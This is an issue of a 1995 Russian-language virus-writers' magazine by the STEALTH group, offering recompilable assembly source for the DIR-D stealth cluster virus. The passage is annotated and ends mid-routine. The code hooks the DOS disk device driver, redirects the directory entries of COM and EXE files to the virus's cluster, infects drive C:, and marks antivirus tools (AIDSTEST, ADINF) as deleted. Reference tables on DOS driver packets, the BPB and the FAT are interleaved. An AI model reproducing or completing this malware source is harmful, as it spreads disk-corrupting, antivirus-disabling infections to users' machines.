           ▄▄                  █
          ▀▀▀ Monthly Magazine █ For VirMakers.                  JULY '95
          ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
           ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▐▀▀█ █
            █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █   ▐▌ █
            █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █   █  █
            ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
           (C) STEALTH group WWide, Box 10, Kiev-148, fUcKRAINE 
 ─────────────────────────────────────────────────────────────────────────────
  Рекомпилируемый DIR-D.
 ─────────────────────────────────────────────────────────────────────────────

 ;██████████████████████████████████████████████████████████████████████████
 ;██                                                                      ██
 ;██                            DIR-D                                     ██
 ;██                                                                      ██
 ;██████████████████████████████████████████████████████████████████████████

                .MODEL TINY
                .CODE
                ORG     100H
START:
                MOV     AH,52H
                INT     21H                     ; DOS Services  ah=function 52h
                                                ;  get DOS data table ptr es:bx
                MOV     DI,ES:[BX+4]
                LES     DI,DWORD PTR ES:[DI-4]
LOC_010C:
                DEC     DI
                CMP     WORD PTR ES:[DI-2],0E18AH       ; mov ah,cl
                JNE     LOC_010C
                MOV     WORD PTR DS:REALOFF21,DI        ; определим настоящие
                MOV     WORD PTR DS:REALSEG21,ES        ; seg:off MS DOS
                MOV     AH,30H                  ; выдать версию DOS в ax
                CALL    I21
                CMP     AL,4            ; корекция для DOS 3.30 si=-1
                SBB     SI,SI
                PUSH    CS
                POP     ES
                MOV     BX,60H
                MOV     AH,4AH          ; уменьшить длину MCB до 60h - 1536 б
                CALL    I21
                MOV     AH,52H          ; получить указатель в es:bx на
                CALL    I21             ; таблицу DOS
                PUSH    WORD PTR ES:[BX-2]      ; параграф первого MCB
                LDS     BX,DWORD PTR ES:[BX]
LOC_013C:
                MOV     AX,[BX+SI+15H]
                CMP     AX,70H          ; сегмент DOS
                JNE     LOC_0154        ; если не он, то дальше.
                XCHG    AX,CX           ; cx=ax
                MOV     BYTE PTR [BX+SI+18H],0FFH       ; изменить в заголовке
                MOV     DI,[BX+SI+13H]          ; некоторое значение
                MOV     WORD PTR [BX+SI+13H],OFFSET VIRUSHEADER ; наш заголовок
                MOV     [BX+SI+15H],CS  ; сегмент нашего заголовка
LOC_0154:
                LDS     BX,DWORD PTR [BX+SI+19H]        ; перейти к следующему
                CMP     BX,0FFFFH                       ; заголовку
                JNE     LOC_013C        ; он последний ?
                JCXZ    LOC_01B5        ; вирус уже в памяти ?
                POP     DS      ; восстановить первый MCB в ds
                MOV     AX,DS   ; это цикл сканирования MCB блоков
                ADD     AX,DS:3
                INC     AX      ; ax - сегмент следущего MCB
                MOV     DX,CS
                DEC     DX
                CMP     AX,DX   ; это наш блок ?
                JNE     LOC_0172
                ADD     WORD PTR DS:3,61H       ; да наш.
LOC_0172:
                MOV     DS,DX
                MOV     WORD PTR DS:1,8         ; признак system
                MOV     DS,CX                   ; что здесь cx и di, ну хоть
                LES     AX,DWORD PTR [DI+6]     ; убейте - незнаю ...
                MOV     WORD PTR CS:DOSOFF1,AX
                MOV     WORD PTR CS:DOSOFF2,ES
                CLD
                MOV     SI,1
LOC_018C:
                DEC     SI
                LODSW
                CMP     AX,1EFFH        ; call far
                JNE     LOC_018C
                MOV     AX,2CAH         ; retf 2
                CMP     [SI+4],AX       ; команды
                JE      LOC_01A5
                CMP     [SI+5],AX
                JE      LOC_01A5
                CMP     [SI-0BH],AX
                JNE     LOC_018C
LOC_01A5:
                LODSW
                PUSH    CS
                POP     ES
                LEA     DI,VAR_495
                STOSW
                XCHG    AX,SI
                LEA     DI,VAR_21F
                CLI
                MOVSW                   ; запомнить сегмент и смещение
                MOVSW                   ; int 13, вызываемый DOS
                JMP     SHORT LOC_01BB
LOC_01B5:
                INT     20H
OPENC           DB       'c:',0FFH, 00H ; имя диска, для заражения диска С:
LOC_01BB:
                PUSH    CS
                POP     DS
                MOV     BX,DS:2CH
                MOV     ES,BX
                MOV     AH,49H          ; удалить MCB блок
                CALL    I21
                XOR     AX,AX
                TEST    BX,BX
                JZ      LOC_01DA
                MOV     DI,1
LOC_01D1:
                DEC     DI
                SCASW
                JNZ     LOC_01D1
                LEA     SI,[DI+2]
                JMP     SHORT LOC_01E6
LOC_01DA:
                MOV     ES,DS:16H
                MOV     BX,ES:16H
                DEC     BX
                XOR     SI,SI
LOC_01E6:
                PUSH    BX
                LEA     BX,VAR_4F2
                MOV     [BX + 4],CS
                MOV     [BX + 8],CS
                MOV     [BX +12],CS
                POP     DS
                PUSH    CS
                POP     ES
                LEA     DI,FNAME
                PUSH    DI
                MOV     CX,40
                REP     MOVSW
                PUSH    CS
                POP     DS
                MOV     AH,3DH
                LEA     DX,OPENC
                CALL    I21
                POP     DX
                MOV     SP,600H
                MOV     AX,4B00H        ; запустить фвйл
                CALL    I21
                MOV     AH,4CH          ; завершить программу

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

I21             PROC    NEAR
                PUSHF
;*              call    far ptr s_003A_40E9     ;*
                DB       9AH
REALOFF21       DB      0E9H, 40H
REALSEG21       DB       3AH, 00H
                RETN
I21             ENDP

INT13:
                MOV     AH,3                    ; просто записать
;*              jmp     far ptr l_DC00_04AD     ; просто int 13h и всё
                DB      0EAH
VAR_21F         DW       4ADH
                DW      0DC00H
DEVSTRATEGY:
                PUSH    AX CX DX DS SI DI
                PUSH    ES ─────────┐
                POP     DS ─────────┘
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                         Заголовок запроса устройства                         ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;Каждый запрос к драйверу устройства сопровождается указателем на структуру
;запроса, или пакет. Каждый пакет запроса начинается таким 13-байтовым заголов-
;ком. При входе в драйвер, ES:BX указывает на пакет с этой структурой.
;
;Смещ.  Длина Содержимое
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───┐
; +0      1  │len│         длина пакета (включая заголовок и данные)
;            ├───┤
; +1      1  │unt│         номер единицы (только для блочных устройств)
;            ├───┤
; +2      1  │cmd│         код команды (00-18H) - специфицирует действие
;            ├───┴───┐
; +3      2  │Status │     слово состояния устройства - заполняет драйвер
;            ├───┴───┴───────────────────────┐
; +5H     8  │ (резерв)                      │
;            ├───┴ ─ ┴ ─ ┴───┴───┼───┴───┴───┘
;+0dH     ?  │ данные            │  данные форматированы согласно коду команды
;            └───┴ ─ ┴ ─ ┴───┴───┘  См. Запросы устройств о форматах данных.
;╔══════════════════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║  еще                   Структуры запросов устройств                 еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;                       ┌───────────────┐
;                       │ Построить BPB │ Код команды устройства = 2
;Смещ.  Длина Содержимое└───────────────┘
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────────────────────────────────────────────────┐
; +0     0dH │ 13-байтовый заголовок запроса                     │
;            ├───┼───┴───┴───┴───┼───┴───┴───┴───┴───┴───┴───┴───┘
; +0dH    1  │   │             Вход: байт дескриптора носителя
;            ├───┴───┬───────┐
; +0eH    4  │ смещ.  сегмент│ Вход: адрес буфера (FAT сектор 0)
;            ├───┴───┼───┴───┤
; +12H    4  │ смещ.  сегмент│ Выход: адрес BPB для этого диска
;            └───┴───┴───┴───┘
;Драйвер должен возвращать указатель на BPB для текущей установленной дискеты.
;Если в атрибуте устройства включен бит не-IBM, то смещение 0eH указывает на
;'junk'. Если блочное устройство имеет IBM-формат, то смещение 0eH указывает на
;первый сектор FAT (считанный перед командой "Построить BPB").
;╔══ ЕЩЕ    ══════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║              Блок параметров BIOS (BIOS Parameter Block - BPB)       еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;Это - подмножество данных, содержащихся в корневом секторе . Запрос к драйверу
;'Построить BPB' требует, чтобы драйвер заполнил блок по показанной ниже схеме.
;
;Смещ.  Длина Содержимое
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────┐
; +0      2  │SectSiz│  байт на сектор
;            ├───┼───┘
; +2      1  │ClustSiz  секторов на единицу респределения (кластер)
;            ├───┴───┐
; +3      2  │ResSecs│  корневых и резервных секторов
;            ├───┼───┘
; +5      1  │FatCnt    число таблиц FAT
;            ├───┴───┐
; +6      2  │RootSiz│  макс.число 32-байтовых элементов в корневом оглавлении
;            ├───┴───┤
; +8      2  │TotSecs│  общее число секторов на носителе (раздел DOS)
;            ├───┼───┘
;+0aH     1  │Media     описатель носителя (то же, что 1-й байт FAT)
;            ├───┴───┐
;+0bH     2  │FatSize│  число секторов в одной FAT
;            └───┴───┘
; 0dH        длина BPB = 13 байт
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                         Структуры запросов устройств                 еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;Кмд Наименование              Исп.   █  Кмд Наименование            Исп.  DOS
;▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀  █  ▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀ ▀▀▀▀
; 0  Инициализировать устр     C,B    █  0aH Статус вывода          C            
; 1  Контроль носителя           B    █  0bH Сброс вывода           C
; 2  Построить BPB               B    █  0cH IOCTL Вывод            C,B,I
; 3  IOCTL Ввод                C,B,I  █  0dH Открыть устройство     C,B,R  3.0+
; 4  Ввод (читать с устр-ва)   C,B    █  0eH Закрыть устройство     C,B,R  3.0+
; 5  Неразрушающий ввод        C      █  0fH Съемный носитель         B,R  3.0+
; 6  Статус ввода              C      █  13H Общий запрос IOCTL         I  3.2
; 7  Сброс ввода               C      █  17H Дать логич устр        C,B    3.2
; 8  Вывод (писать на устр-во) C,B    █  18H Уст логич устр         C,B    3.2
; 9  Вывод с верификацией      C,B    █
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;Использов: C = драйверы символьных устройств ───────────┐
;           B = блочные устройства (обычно дисководы)    ╞═>См. атрибут устр-ва
;           I = требуется поддержка IOCTL                │
;           R = требуется поддержка Open/Close/RM ───────┘
;
;Область данных запроса определяется "кодом команды" (смещение 2 в заголовке ).
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║  еще                   Структуры запросов устройств                 еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;                       ┌────────────────┐
;                       │ Ввод или Вывод │ Код команды устройства: 3,4,8,9,0cH
;Смещ.  Длина Содержимое└────────────────┘
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────────────────────────────────────────────────┐
; +0     0dH │ 13-байтовый заголовок устройства                  │
;            ├───┼───┴───┴───┴───┼───┴───┴───┴───┴───┴───┴───┴───┘
; +0dH    1  │   │             Вход: байт дескриптора носителя
;            ├───┴───┬───────┐
; +0eH    4  │ смещ.  сегмент│ Вход: адрес буфера передачи данных
;            ├───┴───┼───┴───┘
; +12H    2  │Count  │         Вход: счетчик байт (секторов для блочного устр-ва)
;            ├───┴───┤
; +14H    2  │Sector │         Вход: Начальный номер сектора (блочные устр-ва)
;            ├───┴───┼───────┐
; +16H    4  │ смещ.  сегмент│ Выход: адрес имени тома (ASCIIZ)
;            └───┴───┴───┴───┘ (при возврате ошибки устройства = 0fH)
;
;По командам ввода (3,4) устройство должно передать Count байт (секторов для
;╔══ ЕЩЕ    ══════════════════════════════════════════════════════════════════╗
                MOV     AL,[BX+2]       ; код команды (00-18H) - специфицирует
                                        ; действие
                CMP     AL,4    ; 4  Ввод (читать с устр-ва)   C,B
                JE      LOC_0293
                CMP     AL,8    ; 8  Вывод (писать на устр-во) C,B
                JE      OUTDEVICE
                CMP     AL,9    ; 9  Вывод с верификацией      C,B
                JE      OUTDEVICE
                CALL    EXECDRVFUNC      ; Построить BPB. Код команды устройства

                CMP     AL,2            ; = 2 ?
                JNE     LOC_0274
                LDS     SI,DWORD PTR [BX+12H]   ; ds:si - адрес BPB для этого
                                                ; диска
                LEA     DI,MYBPB      ; установить на свой BPB
                MOV     ES:[BX+12H],DI
                MOV     ES:[BX+14H],CS
                PUSH    ES ───────────┐
                PUSH    CS ──────────┐│ ; es=cs
                POP     ES ──────────┘│
                MOV     CX,16         │ ; скопировать 32 байта BPB
                REP     MOVSW         │
                POP     ES ───────────┘
                PUSH    CS ──────────┐  ; ds=cs
                POP     DS ──────────┘
                MOV     AL,[DI-1EH]     ; al - секторов на единицу
                                        ; респределения (кластер)
                CMP     AL,2
                ADC     AL,0                    ; если al<2, то al=al+1
                CBW
                CMP     WORD PTR [DI-18H],0     ; общее число секторов
                                                ; на носителе (раздел DOS)
                JE      LOC_026D
                SUB     [DI-18H],AX     ; уменьшим общее число секторов на 1
                JMP     SHORT LOC_0274
LOC_026D:
                SUB     [DI-0BH],AX
                SBB     WORD PTR [DI-9],0
LOC_0274:
                POP     DI SI DS DX CX AX
DEVINTERRUPT:
                RETF
OUTDEVICE:
                MOV     CX,0FF09H
                CALL    CHECKDISK
                JZ      LOC_0288        ; диск не был заменён
                CALL    EXECDRVFUNC
                JMP     SHORT LOC_0298
LOC_0288:
                JMP     LOC_03AE        ; заразить все файлы диска
LOC_028B:
                JMP     LOC_03A8        ; заразить (вылечить) файлы, вызвав
LOC_028E:                               ; call 4B2
                ADD     SP,16           ; убрать из стека 8 слов
                JMP     SHORT LOC_0274  ; выйти из подрограммы
LOC_0293:
                CALL    CHECKDISK
                JZ      LOC_028B
LOC_0298:
                MOV     BYTE PTR [BX+2],4       ; Ввод (читать с устр-ва)
                CLD
                LEA     SI,[BX+0EH]
                MOV     CX,8
;--- запомнить в стеке:
     ; - адрес буфера передачи данных
     ; - счетчик байт (секторов для блочного устр-ва)
     ; - Начальный номер сектора (блочные устр-ва)
     ; - адрес имени тома (ASCIIZ)
LOCLOOP_02A3:
                LODSW
                PUSH    AX
                LOOP    LOCLOOP_02A3
                MOV     WORD PTR [BX+14H],1     ; Начальный номер сектора = 1
                CALL    EXECFUNCFORONESEC
                JNZ     LOC_028E                ; уход по ошибке
                MOV     BYTE PTR [BX+2],2       ; Построить BPB
                CALL    EXECDRVFUNC
                LDS     SI,DWORD PTR [BX+12H]   ; ds:si - адрес BPB для этого
                                                ; диска
                MOV     AX,[SI+6]       ; макс.число 32-байтовых элементов
                                        ; в корневом оглавлении
                ADD     AX,15
                MOV     CL,4
                SHR     AX,CL           ; ax=ax/16
                MOV     DI,[SI+0BH]     ; число секторов в одной FAT
                ADD     DI,DI           ; di=di*2
                STC
                ADC     DI,AX           ; di=di+ax+1
                PUSH    DI
                CWD
                MOV     AX,[SI+8]       ; общее число секторов на носителе
                TEST    AX,AX
                JNZ     LOC_02DC
                MOV     AX,[SI+15H]     ; общее число секторов на носителе
                MOV     DX,[SI+17H]
LOC_02DC:
                XOR     CX,CX
                SUB     AX,DI   ; определим число информационных секторов
                SBB     DX,CX   ; поправка для dx
                MOV     CL,[SI+2]       ; секторов на единицу респределения
                                        ; (кластер)
                DIV     CX      ; ax=dx:ax/cx
                CMP     CL,2    ; 2 сектора на кластер ? Если 1, то cf=1
                SBB     AX,-1   ; ax=ax+1, если cf=0
                PUSH    AX
                CALL    GETSECFAT
                MOV     BYTE PTR ES:[BX+2],4    ; Ввод (читать с устр-ва)
                MOV     ES:[BX+14H],AX          ; Начальный номер сектора в ax
                CALL    EXECFUNCFORONESEC
LOC_02FD:
                LDS     SI,DWORD PTR ES:[BX+0EH]        ; ds:si - адрес буфера
                                                        ; передачи данных
                ADD     SI,DX           ; dx - остаток от деления sec/512
                SUB     DH,CL           ; cl - секторов на кластер
                ADC     DX,AX           ; ax - номер сектора
                CMP     CL,1
                JE      LOC_0327        ; переход для FAT 1 сектор на кластер
                MOV     AX,[SI]         ; получить последний кластер
                AND     AX,DI           ; наложить маску
                CMP     AX,0FFF7H       ; если кластер плохой, то взять -1
                JE      LOC_031F
                CMP     AX,0FF7H
                JE      LOC_031F
                CMP     AX,0FF70H
                JNE     LOC_0349        ; найден хороший кластер
LOC_031F:
                POP     AX
                DEC     AX
                PUSH    AX
                CALL    GETSECFAT
                JMP     SHORT LOC_02FD
LOC_0327:
                NOT     DI
                AND     [SI],DI
                POP     AX
                PUSH    AX
                INC     AX
                PUSH    AX
                MOV     DX,0FH
                TEST    DX,DI
                JZ      LOC_0339
                INC     DX
                MUL     DX
LOC_0339:
                OR      [SI],AX
                POP     AX
                CALL    GETSECFAT
                MOV     SI,ES:[BX+0EH]
                ADD     SI,DX
                MOV     AX,[SI]
                AND     AX,DI
LOC_0349:
                MOV     DX,DI
                DEC     DX
                AND     DX,DI
                NOT     DI
                AND     [SI],DI
                OR      [SI],DX
                CMP     AX,DX
                POP     AX
                POP     DI
                MOV     WORD PTR CS:CLUSTERBODY,AX
                JZ      LOC_039D
                MOV     DX,[SI]
                PUSH    DS
                PUSH    SI
                CALL    EXECDRVFUNCWRITE          ; нечто вроде write virus
                POP     SI
                POP     DS
                JNZ     LOC_039D
                CALL    EXECFUNCFORONESEC
                CMP     [SI],DX
                JNE     LOC_039D
                DEC     AX
                DEC     AX
                MUL     CX
                ADD     AX,DI
                ADC     DX,0
                PUSH    ES
                POP     DS
                MOV     WORD PTR [BX+12H],2
                MOV     [BX+14H],AX
                TEST    DX,DX
                JZ      LOC_0392
                MOV     WORD PTR [BX+14H],0FFFFH
                MOV     [BX+1AH],AX
                MOV     [BX+1CH],DX
LOC_0392:
                MOV     [BX+10H],CS
                MOV     WORD PTR [BX+0EH],100H
                CALL    EXECDRVFUNCWRITE
LOC_039D:
                STD
                LEA     DI,[BX+1CH]
                MOV     CX,8
LOCLOOP_03A4:
                POP     AX
                STOSW
                LOOP    LOCLOOP_03A4
LOC_03A8:
                CALL    EXECDRVFUNC
                MOV     CX,9
LOC_03AE:
                MOV     DI,ES:[BX+12H]
                LDS     SI,DWORD PTR ES:[BX+0EH]
                SHL     DI,CL                   ; di=di<<9, di=di*512
                XOR     CL,CL
                ADD     DI,SI
                XOR     DL,DL           ; инфицировать файлы по ds:si
                PUSH    DS
                PUSH    SI
                CALL    SUB_03D6        ; нечто вроде infected & restore
                JCXZ    LOC_03CD            
                CALL    EXECDRVFUNCWRITE
                AND     BYTE PTR ES:[BX+4],7FH
LOC_03CD:
                POP     SI
                POP     DS
                INC     DX      ; для dl=0 - восстановить по ds:si (di-si)/32
                CALL    SUB_03D6        ; нечто вроде infected & restore
                JMP     LOC_0274

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

;╔══════════════════════════════════════════════════════════════════════════════╗
;║                    Таблица распределения файлов DOS (FAT)            еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;FAT - это связный список, который DOS использует для отслеживания физического
;расположения данных на диске и для поиска свободной памяти для новых файлов.
;
;Слово по смещению 1aH в элементе оглавления содержит номер кластера для первого
;кластера в цепочке распределения файла. Соответствующий элемент FAT либо указы-
;вает конец цепочки, либо ссылается на следующий элемент, и т.д. Пример:
;
;                                  номер начального кластера ══╗
;Элемент   ╓───────────────────┬─┬───────────────────┬───┬───┬─v─┬───────╖
;оглавления║M Y F I L E   T X T│a│                   │tim│dat│08 │ длина ║
;          ╙─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─╫─┴─┴─┴─┴─╜
;                                    ╔═════════════════════════╝
;    00  01  02  03  04  05  06  07  ║8  09  0a  0b  0c  0d  0e  0f
;   ┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌v─┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐
;00 │ID││ff││03═>04═>05═>ff││00││00││09═>0a═>0b═>15││00││00││00││00│
;   └──┘└──┘└──┘└──┘└──┘└──┘└──┘└──┘└──┘└──┘└──┘└╫─┘└──┘└──┘└──┘└──┘
;                        ╔═══════════════════════╝
;   ┌──┐┌──┐┌──┐┌──┐┌──┐┌v─┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐┌──┐
;10 │00││00││00││00││00││16═>17═>19││f7││1a═>1b═>ff││00││00││00││00│
;   └──┘└──┘└──┘└──┘└──┘└──┘└──┘└╫─┘└──┘└^─┘└──┘└──┘└──┘└──┘└──┘└──┘
;                                ╚═══════╝
;Эта диаграмма иллюстрирует основные концепции FAT. Из нее видно, что:
;
; MYFILE.TXT занимает 10 кластеров. Первый кластер - это кластер 08, последний
;  кластер - 1bH. Цепочка кластеров - 8,9,0a,0b,15,16,17,19,1a,1b. Каждый эле-
;  мент указывает на следующий элемент цепочки, а последний элемент содержит
;  специальный код.
; Кластер 18H помечен как плохой и не входит в цепочку распределения.
; Кластеры 6,7, 0cH-14H и 1cH-1fH пусты и доступны для распределения.
; Еще одна цепочка начинается с кластера 2 и кончается кластером 5. Чтобы узнать
;  имя файла, нужно отыскать элемент оглавления с начальным номером кластера 02.
;
;┌───────────────┐
;│ Кое-что о FAT │ FAT обычно начинается с логического сектора 1 в разделе DOS
;└───────────────┘ (т.е. ее можно прочитать по INT 25H с DX=1). В общем случае
;сначала надо прочитать корневой сектор (DX=0) и взять смещение 0eH. Там указано,
;сколько корневых и резервных секторов стоят перед FAT. Используйте затем это
;число (обычно 1) как содержимое DX, чтобы прочитать FAT через INT 25H.
;╔══ ЕЩЕ    ══════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                        Структура элемента оглавления                 еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;Смещ. Длина Содержимое
;▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────────────────────────────┐
; +0      8  │'F' 'I' 'L' 'E' 'N' 'A' 'M' 'E'│ дополнено справа пробелами
;            ├───┴───┴───┼───┴───┴───┴───┴───┘
; +8      3  │'E' 'X' 'T'│                     дополнено справа пробелами
;            ├───┼───┼───┘
;+0bH     1  │atr│                              атрибут файла
;            ├───┴──────── ─ ─ ────┐
;+0cH    0aH │      резерв         │
;            ├───┴───┼───┴ ─ ─ ┴───┘
;+16H     2  │ time  │           время создания/модификации в формате filetime
;            ├───┴───┤
;+18H     2  │ date  │           дата создания/модификации в формате filetime
;            ├───┴───┤
;+1aH     2  │ClstrNo│      номер начального кластера данных (связь с FAT )
;            ├───┴───┴───────┐
;+1cH     4  │ размер файла  │                  размер файла в байтах
;            └───┴───┴───┴───┘
;+20H                                           размер элемента оглавления
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                                Атрибут файла                         еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
; Некоторые функции DOS требуют в качестве параметра атрибут файла. Атрибут -
; это один байт битовых флагов, связанный с каждым файлом и находящийся в
; элементе оглавления для файла. В атрибуте определены следующие биты:
;
;╓7┬6┬5┬4┬3┬2┬1┬0╖
;║   │a│d│v│s│h│r║
;╙─┴─┴╥┴╥┴╥┴╥┴╥┴╥╜ бит                                                   маска
;     ║ ║ ║ ║ ║ ╚═> 0: 1=только чтение (нельзя обновлять или удалять)    (01H)
;     ║ ║ ║ ║ ╚═══> 1: 1=спрятанный                                      (02H)
;     ║ ║ ║ ╚═════> 2: 1=системный                                       (04H)
;     ║ ║ ╚═══════> 3: 1=метка тома                                      (08H)
;     ║ ╚═════════> 4: 1=элемент подоглавления                           (10H)
;     ╚═══════════> 5: архив. 1=копия файла НЕ создавалась               (20H)
;
;Функции DOS 11H и 4eH поиска в оглавлении позволяют указать один или несколько
;битов атрибута (спрятанный, системный, оглавление, архив), если вы организуете
;поиск файлов с любым из указанных атрибутов (включающий поиск). Если вы опустите
;любой бит, то файл, содержащий этот бит атрибута, не будет найден.
;
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
SUB_03D6        PROC    NEAR
LOC_03D6:
                MOV     AX,[SI+8]
                CMP     AX,'BD'                ; 'DB'
                JNE     LOC_03E7                ; проверка fname,'db'f
                CMP     BYTE PTR [SI+0AH],'F'   ; 'F'
                JNE     LOC_03E7
                DEC     BYTE PTR [SI+1DH]       ; уменьшить длину файла
LOC_03E7:                                       ; на 256 байт
                CMP     WORD PTR [SI],'IA'      ; 'AI'
                JNE     LOC_03F7                ; проверка 'aids'test.exe
                CMP     WORD PTR [SI+2],'SD'    ; 'DS'
                JNE     LOC_03F7
LOC_03F4:
                MOV     BYTE PTR [SI],0E5H      ; признак удаленного файла
LOC_03F7:
                CMP     WORD PTR [SI],'DA'      ; 'AD'
                JNE     LOC_0404                ; проверка 'adin'f.exe
                CMP     WORD PTR [SI+2],'NI'    ; 'IN'
                JE      LOC_03F4
LOC_0404:
                CMP     AX,'XE'                 ; 'EX'
                JNE     LOC_040E                ; проверка fname.'ex'e
                CMP     [SI+0AH],AL             ; проверка fname.ex'e'
                JE      LOC_0426
LOC_040E:
                CMP     WORD PTR [SI],'OC'      ; 'CO'
                JNE     LOC_041B                ; проверка 'comm'and.com
                CMP     WORD PTR [SI+2],'MM'    ; 'MM'
                JE      LOCLOOP_0456
LOC_041B:
                CMP     AX,'OC'                 ; 'CO'
                JNE     LOCLOOP_0456            ; проверка fname.'co'm
                CMP     BYTE PTR [SI+0AH],'M'   ; 'M'
                JNE     LOCLOOP_0456            ; проверка fname.xx'm'
LOC_0426:
                TEST    WORD PTR [SI+1EH],0FFC0H        ; старшее слово длины
                JNZ     LOCLOOP_0456                    ; файла
                TEST    WORD PTR [SI+1DH],3FF8H         ; старше-младшее слово
                JZ      LOCLOOP_0456
                TEST    BYTE PTR [SI+0BH],1CH   ; атрибут файла  00011100b
                JNZ     LOCLOOP_0456
                TEST    DL,DL
                JNZ     LOC_044E        ; переход на восстановление кластера
CLUSTERBODY     EQU     $+1
                MOV     AX,0A04H        ; начальнай кластер
                CMP     AX,[SI+1AH]     ; проверка текущего кластера
                JE      LOCLOOP_0456
                XCHG    AX,[SI+1AH]     ; запомнить настоящий
                MOV     [SI+12H],AX     ; кластер в 12h (18) 12-21 зарезервировано
                LOOP    LOCLOOP_0456
LOC_044E:
                XOR     AX,AX
                XCHG    AX,[SI+12H]     ; восстановить начальный кластер
                MOV     [SI+1AH],AX
LOCLOOP_0456:
                ADD     SI,32
